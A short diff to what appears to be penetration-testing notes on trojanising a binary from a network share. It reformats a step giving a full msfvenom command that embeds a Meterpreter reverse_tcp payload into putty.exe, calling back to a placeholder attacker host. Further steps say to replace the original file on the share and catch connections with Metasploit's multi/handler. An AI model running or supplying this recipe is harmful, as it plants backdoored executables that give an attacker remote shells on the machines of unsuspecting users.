@@ -14,6 +14,8 @@
 
 #### 1) Download binary from share
 
-#### 2) msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACK_IP lport=PORT -b "\x00" -f exe -o puttyX.exe
+#### 2) 
+
+    msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACK_IP lport=PORT -b "\x00" -f exe -o puttyX.exe
 
 #### 3) Replace file and wait for connections with exploit/multi/handler (metasploit)
